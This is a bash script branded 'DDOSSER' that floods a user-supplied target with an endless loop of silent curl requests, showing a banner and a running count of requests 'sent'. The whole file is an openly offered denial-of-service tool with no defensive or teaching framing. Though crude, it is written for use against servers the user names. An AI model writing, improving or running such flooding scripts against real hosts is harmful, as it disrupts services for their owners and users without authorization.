#!/bin/bash

# Clear the screen
clear

# VARIABLES
target=$1
count=0

# Colors
RED="\e[31m"        # Classic RED
GREEN="\e[32m"      # Classic GREEN
YELLOW="\e[33m"     # Classic YELLOW
BLUE="\e[34m"       # Classic BLUE
PURPLE="\e[35m"     # Classic PURPLE
BG_RED="\e[41m"     # Background RED
BG_GREEN="\e[42m"   # Background GREEN
BG_YELLOW="\e[43m"  # Background YELLOW
BG_BLUE="\e[44m"    # Background BLUE
BG_PURPLE="\e[45m"  # Background PURPLE
NE="\e[0m"          # No color

# Functions

function BANNER() {
    echo -e "${PURPLE}______  ______   _____  _______ _______  ______";
    echo "|     \ |     \ |     | |______ |______ |_____/";
    echo "|_____/ |_____/ |_____| ______| |______ |    \_";
    echo  -e "                                      Trabbit  ${NE}";
    echo
}

function DDOS_SERVER() {
    if [[ -z $target ]]; then
        echo -e "${RED}No Target Provided!${NE}"
        exit 1
    fi

    echo -e "${GREEN}Starting attack on ${YELLOW}$target${NE}"
    echo

    while true; do
        count=$((count + 1))  # Increment the counter
        curl --silent $target > /dev/null  # Send a request silently
        echo -e "${BLUE}(${YELLOW}$count${BLUE}) - [${YELLOW}$target${BLUE}] => ${GREEN}Sent${NE}"
    done
}

# Graceful Exit
trap "echo -e '${RED}Script Interrupted. Exiting...${NE}'; exit 1" SIGINT

# Main function
main() {
    BANNER
    DDOS_SERVER
}

# Call the main function
main
